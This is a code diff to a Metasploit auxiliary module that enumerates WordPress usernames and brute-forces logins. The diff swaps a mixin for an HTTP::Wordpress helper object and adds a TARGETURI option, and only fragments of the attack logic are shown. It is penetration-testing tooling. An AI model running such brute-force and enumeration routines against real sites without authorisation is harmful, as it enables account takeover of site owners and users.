@@ -5,9 +5,10 @@
 #   http://metasploit.com/
 ##
 
-class Metasploit3 < Msf::Auxiliary
+require 'http/wordpress'
 
-	include Msf::Exploit::Remote::Wordpress
+class Metasploit3 < Msf::Auxiliary
+	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::AuthBrute
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
@@ -35,6 +36,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
+				OptString.new('TARGETURI', [true, 'The base path to the wordpress application', '/']),
 				OptBool.new('VALIDATE_USERS', [ true, 'Validate usernames', true ]),
 				OptBool.new('BRUTEFORCE', [ true, 'Perform brute force authentication', true ]),
 				OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),
@@ -45,8 +47,9 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
+		@wordpress = HTTP::Wordpress.new(self)
 
-		unless wordpress_and_online?
+		unless @wordpress.wordpress_and_online?
 			fail_with(Failure::NoTarget, "#{target_uri} does not seeem to be Wordpress site")
 		end
 
@@ -102,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
 	def do_enum(user=nil)
 		print_status("#{target_uri} - WordPress Enumeration - Checking Username:'#{user}'")
 
-		exists = wordpress_user_exists?(user)
+		exists = @wordpress.wordpress_user_exists?(user)
 		if exists
 			print_good("#{target_uri} - WordPress Enumeration- Username: '#{user}' - is VALID")
 			report_auth_info(
@@ -125,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 	def do_login(user=nil, pass=nil)
 		vprint_status("#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")
 
-		cookie = wordpress_login(user, pass)
+		cookie = @wordpress.wordpress_login(user, pass)
 
 		if cookie
 			print_good("#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
@@ -148,7 +151,7 @@ class Metasploit3 < Msf::Auxiliary
 	def enum_usernames
 		usernames = []
 		for i in datastore['RANGE_START']..datastore['RANGE_END']
-			username = wordpress_userid_exists?(i)
+			username = @wordpress.wordpress_userid_exists?(i)
 			if username
 				print_good "#{target_uri} - Found user '#{username}' with id #{i.to_s}"
 				usernames << username
